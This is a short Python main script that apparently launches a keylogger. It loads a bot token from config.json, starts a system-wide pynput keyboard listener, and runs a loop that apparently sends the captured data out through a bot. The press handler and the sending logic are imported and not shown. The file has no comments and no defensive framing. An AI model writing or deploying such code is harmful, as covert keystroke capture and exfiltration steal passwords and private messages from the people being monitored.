import threading
from pynput.keyboard import Listener
from bot import Bot, data_sender_loop
from keyboard_listener import press
from user_db import UserDb
import json


if __name__ == "__main__":
    with open('config.json', 'r') as config_file:
        config = json.load(config_file)
        TOKEN = config['BOT_TOKEN']
        DB_NAME = config['DB_NAME']

    bot = Bot(TOKEN, DB_NAME)
    bot_thread = threading.Thread(target=bot.start)
    bot_thread.start()

    listener_thread = threading.Thread(target=lambda: Listener(on_press=press).start())
    listener_thread.start()

    data_sender_thread = threading.Thread(target=data_sender_loop, args=(bot,))
    data_sender_thread.start()
